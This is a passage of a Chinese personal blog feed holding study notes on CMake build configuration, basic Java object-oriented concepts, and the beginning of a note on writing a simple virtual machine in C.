data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 add_library 调用中包含了源文件，用于创建名称为 libhello_library.so 的动态库。</p>\n<h2 id=\"五build-type\"><a class=\"markdownIt-Anchor\" href=\"#五build-type\">#</a> （五）build-type</h2>\n<h3 id=\"cmakeliststxt-5\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-5\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#如果没有指定则设置默认编译方式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> <span class=\"token operator\">AND</span> <span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_CONFIGURATION_TYPES</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">#在命令行中输出 message 里的信息</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">message</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Setting build type to 'RelWithDebInfo' as none was specified.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">#不管 CACHE 里有没有设置过 CMAKE_BUILD_TYPE 这个变量，都强制赋值这个值为 RelWithDebInfo</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_BUILD_TYPE</span> RelWithDebInfo <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Choose the type of build.\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\"># 当使用 cmake-gui 的时候，设置构建级别的四个可选项</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">set_property</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CACHE</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> PROPERTY <span class=\"token property\">STRINGS</span> <span class=\"token string\">\"Debug\"</span> <span class=\"token string\">\"Release\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"MinSizeRel\"</span> <span class=\"token string\">\"RelWithDebInfo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>build_type<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_build_type main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#这里的注释只说明注释后每一句的作用</span></pre></td></tr></table></figure><h3 id=\"构建级别\"><a class=\"markdownIt-Anchor\" href=\"#构建级别\">#</a> 构建级别</h3>\n<p>CMake 具有许多内置的构建配置，可用于编译工程。 这些配置指定了代码优化的级别，以及调试信息是否包含在二进制文件中。</p>\n<p>这些优化级别，主要有：</p>\n<ul>\n<li>\n<p>Release —— 不可以打断点调试，程序开发完成后发行使用的版本，占的体积小。 它对代码做了优化，因此速度会非常快，</p>\n<p>在编译器中使用命令：  <code>-O3 -DNDEBUG</code>  可选择此版本。</p>\n</li>\n<li>\n<p>Debug —— 调试的版本，体积大。</p>\n<p>在编译器中使用命令：  <code>-g</code>  可选择此版本。</p>\n</li>\n<li>\n<p>MinSizeRel—— 最小体积版本</p>\n<p>在编译器中使用命令： <code>-Os -DNDEBUG</code>  可选择此版本。</p>\n</li>\n<li>\n<p>RelWithDebInfo—— 既优化又能调试。</p>\n<p>在编译器中使用命令： <code>-O2 -g -DNDEBUG</code>  可选择此版本。</p>\n</li>\n</ul>\n<h3 id=\"设置级别的方式\"><a class=\"markdownIt-Anchor\" href=\"#设置级别的方式\">#</a> 设置级别的方式</h3>\n<h4 id=\"cmake图形界面\"><a class=\"markdownIt-Anchor\" href=\"#cmake图形界面\">#</a> CMake 图形界面</h4>\n<p>cmake-gui</p>\n<h4 id=\"cmake命令行中\"><a class=\"markdownIt-Anchor\" href=\"#cmake命令行中\">#</a> CMake 命令行中</h4>\n<p>在命令行运行 CMake 的时候， 使用 cmake 命令行的 - D 选项配置编译类型</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake .. -DCMAKE_BUILD_TYPE=Release</pre></td></tr></table></figure><h2 id=\"六-compile-flags\"><a class=\"markdownIt-Anchor\" href=\"#六-compile-flags\">#</a> （六） Compile Flags</h2>\n<h3 id=\"cmakeliststxt-6\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-6\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#强制设置默认 C++ 编译标志变量为缓存变量，如 CMake（五） build type 所说，该缓存变量被定义在文件中，相当于全局变量，源文件中也可以使用这个变量</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Set C++ Compiler Flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>compile_flags<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#为可执行文件添加私有编译定义</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">target_compile_definitions</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> EX3</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"编译标志\"><a class=\"markdownIt-Anchor\" href=\"#编译标志\">#</a> 编译标志</h3>\n<p>编译标志是编译器在编译过程中使用的一些参数，用于指定编译器的行为。不同的编译标志会影响编译器的行为，从而影响生成的可执行文件的行为。例如，使用不同的编译标志可以控制编译器的优化级别、警告级别、调试信息等。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI3ODI1NDUxL2FydGljbGUvZGV0YWlscy8xMDMzOTI3MTk=\">1</span></p>\n<p>在 CMake 中，可以使用以下方法设置编译标志：</p>\n<ul>\n<li>通过 target_compile_definitions () 函数设置某个目标的编译标志，这是现代 CMake 中设置 C++ 标志的推荐方法。</li>\n<li>设置默认编译标志，可以使用以下方法：</li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c++ compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>设置全局 C 编译器标志，可以使用以下方法：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDkyMTI2NTA=\">参考</span></li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_C_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_C_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>不同的编译标志会影响编译器的行为，从而影响生成的可执行文件的行为。例如，使用不同的编译标志可以控制编译器的优化级别、警告级别、调试信息等。</p>\n<h2 id=\"七-including-third-party\"><a class=\"markdownIt-Anchor\" href=\"#七-including-third-party\">#</a> （七） Including Third Party</h2>\n<h3 id=\"cmakeliststxt-7\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-7\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Set the project name</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>third_party_include<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># find a boost install with the libraries filesystem and system</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#使用库文件系统和系统查找 boost install</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#这是第三方库，而不是自己生成的静态动态库</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># check if boost was found</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>Boost_FOUND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"boost found\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span>FATAL_ERROR <span class=\"token string\">\"Cannot find Boost\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Add an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>third_party_include main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># link against the boost libraries</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> third_party_include</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"cmake解析\"><a class=\"markdownIt-Anchor\" href=\"#cmake解析\">#</a> CMake 解析</h3>\n<p>几乎所有不平凡的项目都将要求包含第三方库，头文件或程序。 CMake 支持使用 find_package（）函数查找这些工具的路径。  这将从 CMAKE_MODULE_PATH 中的文件夹列表中搜索格式为 “FindXXX.cmake” 的 CMake 模块。  在 linux 上，默认搜索路径将是 /usr/share /cmake/ Modules。  在我的系统上，这包括对大约 142 个通用第三方库的支持。</p>\n<p>此示例要求将 Boost 库安装在默认系统位置。</p>\n<h3 id=\"finding-a-package\"><a class=\"markdownIt-Anchor\" href=\"#finding-a-package\">#</a> Finding a Package</h3>\n<p>如上所述，find_package（）函数将从 CMAKE_MODULE_PATH 中的文件夹列表中搜索 “FindXXX.cmake” 中的 CMake 模块。 find_package 参数的确切格式取决于要查找的模块。  这通常记录在 FindXXX.cmake 文件的顶部。</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参数：</p>\n<p>Boost - 库名称。 这是用于查找模块文件 FindBoost.cmake 的一部分</p>\n<p>1.46.1 - 需要的 boost 库最低版本</p>\n<p>REQUIRED - 告诉模块这是必需的，如果找不到会报错</p>\n<p>COMPONENTS - 要查找的库列表。从后面的参数代表的库里找 boost</p>\n<p>可以使用更多参数，也可以使用其他变量。 在后面的示例中提供了更复杂的设置。</p>\n<h2 id=\"18-用clang编译工程我略了\"><a class=\"markdownIt-Anchor\" href=\"#18-用clang编译工程我略了\">#</a> 1.8 用 clang 编译工程 (我略了)</h2>\n<p>使用 CMake 进行构建时，可以设置 C 和 C ++ 编译器。 此示例与<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZnVtZWNqZi5naXRodWIuaW8vY21ha2UtZXhhbXBsZXMtQ2hpbmVzZS9BLWhlbGxvLWNtYWtl\"> hello-cmake</span> 示例相同，不同之处在于它显示了将编译器从默认的 gcc 更改为<span class=\"exturl\" data-url=\"aHR0cDovL2NsYW5nLmxsdm0ub3JnLw==\"> clang</span> 的最基本方法。</p>\n<h2 id=\"19-用ninja构建工程略啦\"><a class=\"markdownIt-Anchor\" href=\"#19-用ninja构建工程略啦\">#</a> 1.9 用 ninja 构建工程 (略啦)</h2>\n<p>CMake 是一个元构建系统，可用于为许多其他构建工具创建构建文件。 这个例子展示了如何让 CMake 使用 ninja 构建工具。</p>\n<h2 id=\"110-导入第三方库到目标\"><a class=\"markdownIt-Anchor\" href=\"#110-导入第三方库到目标\">#</a> 1.10 导入第三方库到目标</h2>\n<h3 id=\"导入目标\"><a class=\"markdownIt-Anchor\" href=\"#导入目标\">#</a> 导入目标</h3>\n<p>Imported targets 是 FindXXX 模块导出的只读目标。</p>\n<p>在 CMake 命令中包含 boost 这个库：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> imported_targets</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>          <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>\n<p>作用是自动链接 Boost</p>\n<p>filesystem 和 Boost :: system 库，同时还包括 Boost 头文件目录。</p>\n</li>\n</ul>\n<h2 id=\"111-设置c-标准\"><a class=\"markdownIt-Anchor\" href=\"#111-设置c-标准\">#</a> 1.11 设置 C++ 标准</h2>\n<p>CMake 支持传递一个变量给函数 CMAKE_CXX_COMPILER_FLAG 来编译程序。 然后将结果存储在您传递的变量中。</p>\n<p>For example:</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span>CheckCXXCompilerFlag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">CHECK_CXX_COMPILER_FLAG</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-std=c++11\"</span> COMPILER_SUPPORTS_CXX11<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"21子项目\"><a class=\"markdownIt-Anchor\" href=\"#21子项目\">#</a> 2.1 子项目</h2>\n<p>本示例说明如何包含子项目。 顶级 CMakeLists.txt 调用子目录中的 CMakeLists.txt 来创建以下内容：</p>\n<ul>\n<li>sublibrary1 - 一个静态库</li>\n<li>sublibrary2 - 只有头文件的库</li>\n<li>subbinary - 一个可执行文件</li>\n</ul>\n<p>文件树如下:</p>\n<pre><code>$ tree\n.\n├── CMakeLists.txt\n├── subbinary\n│   ├── CMakeLists.txt\n│   └── main.cpp\n├── sublibrary1\n│   ├── CMakeLists.txt\n│   ├── include\n│   │   └── sublib1\n│   │       └── sublib1.h\n│   └── src\n│       └── sublib1.cpp\n└── sublibrary2\n    ├── CMakeLists.txt\n    └── include\n        └── sublib2\n            └── sublib2.h\n</code></pre>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "title": "JAVA学习",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\">#</a> JAVA</h1>\n<p>[^Java 是一种面向对象的编程语言，它支持类和对象的概念。类是一种用户定义的数据类型，它包含了数据域和方法。对象是类的一个实例，它可以操作类中定义的方法和数据。]:</p>\n<p>个人在学习 JAVA 过程中的一些总结</p>\n<h2 id=\"一些java与c的区别\"><a class=\"markdownIt-Anchor\" href=\"#一些java与c的区别\">#</a> 一些 JAVA 与 C 的区别</h2>\n<p>Java 和 C 语言有以下几个区别：</p>\n<ol>\n<li>Java 是一种面向对象的编程语言，而 C 语言是一种过程式编程语言。</li>\n<li>Java 有垃圾回收机制，而 C 语言需要手动管理内存。</li>\n<li>Java 可以跨平台运行，而 C 语言通常需要编译成特定的机器码才能运行。</li>\n<li>Java 支持继承、封装和多态等面向对象编程的概念，而 C 语言不支持这些概念。</li>\n<li>Java 有自己的虚拟机（JVM）来解释和执行字节码，而 C 语言直接编译成机器码运行。</li>\n</ol>\n<h2 id=\"类的定义\"><a class=\"markdownIt-Anchor\" href=\"#类的定义\">#</a> 类的定义</h2>\n<p>在 Java 中，通过关键字  <code>class</code>  来定义一个类。类的定义一般包含以下几部分：</p>\n<pre><code>public class ClassName &#123;\n    // 定义数据域\n    // ...\n\n    // 定义方法\n    // ...\n&#125;\n</code></pre>\n<p>其中  <code>public</code>  是访问修饰符，用于指定类的访问权限。类名  <code>ClassName</code>  可以自定义，但是必须符合 Java 的命名规范。</p>\n<h2 id=\"对象的创建\"><a class=\"markdownIt-Anchor\" href=\"#对象的创建\">#</a> 对象的创建</h2>\n<p>使用  <code>new</code>  关键字可以创建一个对象。例如：</p>\n<pre><code>ClassName object = new ClassName();\n</code></pre>\n<p>这里  <code>ClassName</code>  是类名， <code>object</code>  是对象名， <code>new</code>  关键字用于创建对象。通过  <code>.</code>  运算符可以访问对象的属性和方法，例如：</p>\n<pre><code>object.propertyName;\nobject.methodName();\n</code></pre>\n<h2 id=\"对象的构造和析构\"><a class=\"markdownIt-Anchor\" href=\"#对象的构造和析构\">#</a> 对象的构造和析构</h2>\n<p>在 Java 中，对象的构造方法和析构方法分别是  <code>constructor</code>  和  <code>finalize</code> 。构造方法在对象创建时被调用，用于初始化对象的状态；析构方法在对象销毁时被调用，用于清理对象的状态。</p>\n<pre><code>public ClassName() &#123;\n    // 构造方法代码\n&#125;\n\nprotected void finalize() &#123;\n    // 析构方法代码\n&#125;\n</code></pre>\n<h2 id=\"封装\"><a class=\"markdownIt-Anchor\" href=\"#封装\">#</a> 封装</h2>\n<p>在 Java 中，封装是一种面向对象的编程概念。它指的是将数据和方法封装在一个类中，并通过访问修饰符来控制对这些数据和方法的访问权限。Java 中的访问修饰符包括  <code>public</code> 、 <code>private</code> 、 <code>protected</code>  和默认访问修饰符。其中， <code>public</code>  表示公共访问权限， <code>private</code>  表示私有访问权限， <code>protected</code>  表示受保护的访问权限，而默认访问修饰符则表示包级访问权限。</p>\n<h2 id=\"继承\"><a class=\"markdownIt-Anchor\" href=\"#继承\">#</a> 继承</h2>\n<p>继承是 Java 中另一个重要的面向对象编程概念。它指的是子类继承父类的属性和方法，并且可以在子类中添加新的属性和方法。Java 中的继承关系可以用  <code>extends</code>  关键字表示，例如：</p>\n<pre><code>class SubClassName extends SuperClassName &#123;\n    // 子类的属性和方法\n&#125;\n</code></pre>\n<h2 id=\"多态\"><a class=\"markdownIt-Anchor\" href=\"#多态\">#</a> 多态</h2>\n<p>多态是 Java 中的另一个重要的面向对象编程概念。它指的是同一个方法在不同的对象上可以有不同的实现方式。Java 中的多态可以通过方法重载和方法重写来实现。</p>\n<p>方法重载指的是在同一个类中定义两个或多个方法，它们具有相同的方法名但是参数列表不同。方法重写指的是在子类中重新定义一个和父类中相同名称和参数列表的方法。重载方法允许你使用同样的名字来定义不同的方法，只要它们的参数列表是不同的。Java 根据方法签名决定使用哪个方法 (当编译器无法判断哪个是最精确的匹配时会产生歧义调用)</p>\n<p>[^ 方法签名指的是一个方法的名称、参数数量和参数类型的组合。方法签名可以用于重载方法，即在同一个类中定义多个同名但参数列表不同的方法。Java 要求方法签名必须唯一，否则编译器会报错。]:</p>\n<h2 id=\"杂\"><a class=\"markdownIt-Anchor\" href=\"#杂\">#</a> 杂</h2>\n<p>每个 java 程序至少应该有一个类</p>\n<p>一个源文件中只能有一个 public 类</p>\n<p>一个源文件可以有多个非 public 类</p>\n<p>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为 Employee.java。</p>\n<p>程序是从 main 方法开始执行的</p>\n<p>使用 Math 类中的方法求解数学问题:abs 方法返回一个数 (int,long,float 或 double 型) 的绝对值</p>\n<p>random () 方法生成大于等于 0.0 且小于 1.0 的 double 型随机数</p>\n<p>比较和测试字符用 Character 类的方法</p>\n<p>this 引用数据域，this 调用构造方法</p>\n<p>格式化控制台输出 System.out.printf</p>\n<p><strong>java 支持 foreach 循环</strong> 从而不使用下标变量就可以顺序遍历整个数组</p>\n<p>语法如下：</p>\n<pre><code>for (元素类型 元素变量 : 数组或集合) &#123;\n    // 循环体\n&#125;\n</code></pre>\n<p>其中， <code>元素类型</code>  指的是数组或集合中元素的类型， <code>元素变量</code>  是循环遍历过程中每个元素的变量名， <code>数组或集合</code>  是要遍历的对象。</p>\n<p>以下是一个使用 foreach 循环遍历数组的例子：</p>\n<pre><code>int[] numbers = &#123;1, 2, 3, 4, 5&#125;;\nfor (int number : numbers) &#123;\n    System.out.println(number);\n&#125;\n</code></pre>\n<p>java.util.Arrays 类包含一些实用的方法用于数组操作，比如排序和查找</p>\n<p><strong>定义一个标准的类</strong></p>\n<p>一个标准的类通常要拥有四个组成部分:</p>\n<p>1. 所有的成员变量都要使用 private 关键字修饰</p>\n<p>2. 为每一个成员变量编写一对 getter/setter 方法</p>\n<p>3. 编写一个无参数的构造方法</p>\n<p>4. 编写一个全参数的构造方法</p>\n<p>[^ 这样标准的类叫做 Java Bean]:</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "url": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "title": "Write Virtual Machine",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"编写自己的虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#编写自己的虚拟机\">#</a> 编写自己的虚拟机</h1>\n<h2 id=\"什么是虚拟机\"><a class=\"markdownIt-Anchor\" href=\"#什么是虚拟机\">#</a> 什么是虚拟机</h2>\n<img data-src=\"\\images\\p272648921.jpg\" alt=\"p272648921\" style=\"zoom: 50%;\">\n<h2 id=\"虚拟机的硬件组件的模拟\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机的硬件组件的模拟\">#</a> 虚拟机的硬件组件的模拟</h2>\n<h3 id=\"内存空间\"><a class=\"markdownIt-Anchor\" href=\"#内存空间\">#</a> 内存空间</h3>\n<p>虚拟机中模拟内存硬件的作用是为了在一个完全隔离的环境中运行一个完整的计算机系统</p>\n<h3 id=\"寄存器\"><a class=\"markdownIt-Anchor\" href=\"#寄存器\">#</a> 寄存器</h3>\n<p>一个寄存器就是 CPU 上一个能够存储单个数据的槽。<strong>寄存器就像 CPU 的 “工作台”</strong>。<strong>CPU 要对一段数据进行处理，必须先将数据放到某个寄存器中</strong>。但因为寄存器的数量很少，因此在任意时刻只能有很少的数据加载到寄存器。计算机的解决办法是：首先将数据从内存加载到寄存器，然后将计算结果放到其他寄存器，最后将最终结果 再写回内存。</p>\n<h3 id=\"指令集\"><a class=\"markdownIt-Anchor\" href=\"#指令集\">#</a> 指令集</h3>\n<p>指令是告诉 CPU 执行一些基本任务的命令，例如将两个数字相加。指令既有指示要执行的任务类型的<strong>操作码</strong>，也有一组为正在执行的任务提供输入的<strong>参数。</strong></p>\n<p>每个<strong>操作码</strong>代表 CPU “知道” 如何执行的一项任务。</p>\n<h3 id=\"条件标志位\"><a class=\"markdownIt-Anchor\" href=\"#条件标志位\">#</a> 条件标志位</h3>\n<p><code>R_COND</code>  寄存器存储条件标记，其中记录了最近一次计算的执行结果。 这使得程序可以完成诸如  <code>if (x &gt; 0) &#123; ... &#125;</code>  之类的逻辑条件。</p>\n<p>每个 CPU 都有很多条件标志位来表示不同的情形。</p>\n<h2 id=\"一些原理\"><a class=\"markdownIt-Anchor\" href=\"#一些原理\">#</a> 一些原理</h2>\n<h3 id=\"机器码\"><a class=\"markdownIt-Anchor\" href=\"#机器码\">#</a> 机器码</h3>\n<p>一种称为 <strong>汇编器</strong>（assembler）的工具会<strong>将这些文本格式的指令转换成 16 比特的二进制指令， 后者是虚拟机可以理解的</strong>。这种二进制格式称为机器码（machine code），是虚拟机可以执行的格式，其本质上就是一个 16 比特指令组成的数组。</p>\n<p><img data-src=\"/images/assembler.png\" alt=\"image.png\"></p>\n<h3 id=\"中断异常trap的了解\"><a class=\"markdownIt-Anchor\" href=\"#中断异常trap的了解\">#</a> 中断，异常，trap 的了解</h3>\n<p>这几个我都还没做 233</p>\n<p><img data-src=\"/images/image-20230317165448823.png\" alt=\"image.png\"></p>\n<h2 id=\"探索实现x86架构的虚拟机c语言\"><a class=\"markdownIt-Anchor\" href=\"#探索实现x86架构的虚拟机c语言\">#</a> 探索 &amp; 实现 x86 架构的虚拟机 (C 语言)</h2>\n<p>基于 x86 架构的虚拟机实现可以分为以下几个步骤：</p>\n<ul>\n<li>\n<p>设计虚拟机的结构</p>\n</li>\n<li>\n<p>编写虚拟机的初始化和运行函数</p>\n</li>\n<li>\n<p>编写虚拟机的指令集的各指令的实现函数和执行虚拟机的函数</p>\n</li>\n</ul>\n<h3 id=\"虚拟机的基本结构\"><a class=\"markdownIt-Anchor\" href=\"#虚拟机的基本结构\">#</a> 虚拟机的基本结构</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td 